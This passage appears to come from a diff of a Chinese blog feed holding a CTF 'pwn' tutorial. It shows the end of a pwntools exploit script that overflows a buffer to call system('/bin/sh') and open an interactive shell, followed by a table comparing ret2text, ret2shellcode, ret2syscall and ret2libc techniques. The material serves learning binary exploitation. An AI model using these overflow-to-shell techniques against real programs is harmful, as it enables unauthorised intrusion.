class="line"></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + p32(<span class="number">1234</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.recvuntil()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="25f9c7fa">**<font style="color:rgb(64, 64, 64);">总结对比表</font>**</h2>
+| **技术** | **NX状态** | **关键条件** | **典型场景** |
+| --- | --- | --- | --- |
+| **<font style="color:rgb(64, 64, 64);">ret2text</font>** | <font style="color:rgb(64, 64, 64);">任意</font> | <font style="color:rgb(64, 64, 64);">程序内部有可用代码（如后门函数）</font> | <font style="color:rgb(64, 64, 64);">存在隐藏的</font>`<font style="color:rgb(64, 64, 64);">system("/bin/sh")</font>` |
+| **<font style="color:rgb(64, 64, 64);">ret2shellcode</font>** | <font style="color:rgb(64, 64, 64);">关闭</font> | <font style="color:rgb(64, 64, 64);">可执行内存 + Shellcode写入</font> | <font style="color:rgb(64, 64, 64);">无NX，允许直接执行代码</font> |
+| **<font style="color:rgb(64, 64, 64);">ret2syscall</font>** | <font style="color:rgb(64, 64, 64);">开启</font> | <font style="color:rgb(64, 64, 64);">ROP Gadget + 系统调用参数</font> | <font style="color:rgb(64, 64, 64);">无Libc泄露，但能拼凑系统调用</font> |
+| **<font style="color:rgb(64, 64, 64);">ret2libc</font>** | <font style="color:rgb(64, 64, 64);">开启</font> | <font style="color:rgb(64, 64, 64);">Libc泄露 +</font><font style="color:rgb(64, 64, 64);"> </font>`<font style="color:rgb(64, 64, 64);">system</font>`<br><font style="color:rgb(64, 64, 64);">/</font>`<font style="color:rgb(64, 64, 64);">/bin/sh</font>` | <font style="color:rgb(64, 64, 64);">动态链接，可泄露Libc地址</font> |
+
+
+  
+ 
+
 ]]></content>
       <categories>
         <category>pwn</category>
